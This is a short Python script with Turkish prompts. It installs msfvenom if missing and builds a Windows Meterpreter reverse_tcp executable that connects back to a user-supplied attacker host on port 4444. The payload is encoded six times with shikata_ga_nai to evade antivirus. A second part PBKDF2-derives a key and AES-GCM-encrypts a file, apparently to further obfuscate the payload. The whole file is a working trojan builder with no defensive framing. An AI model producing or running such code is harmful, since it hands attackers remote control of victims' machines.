import os
import subprocess as sb
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def genel_cont(file_name):
    result = sb.run("which msfvenom", shell=True, capture_output=True, text=True)


    if result.returncode == 0:
        pass
    else:
        print("msfvenom yüklü değil, yükleniyor...")
        sb.run("apt install msfvenom", shell=True)
    LHOST = input("lütfen LHOST degerini giriniz: ")
   
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST={LHOST} LPORT=4444 -i 6 --format exe -o {file_name}.exe")
    os.system("clean")
    print("port default : 4444")


def generate_key(password):
    salt = os.urandom(16) 
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode()) 
    return key, salt


def encrypt_file(filename, password):
    key, salt = generate_key(password)
    iv = os.urandom(12)  

    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()

    with open(filename, "rb") as f:
        plaintext = f.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

   
    with open(filename + ".enc", "wb") as f:
        f.write(salt + iv + encryptor.tag + ciphertext)

    print("Dosya başarıyla şifrelendi: ", filename + ".enc")




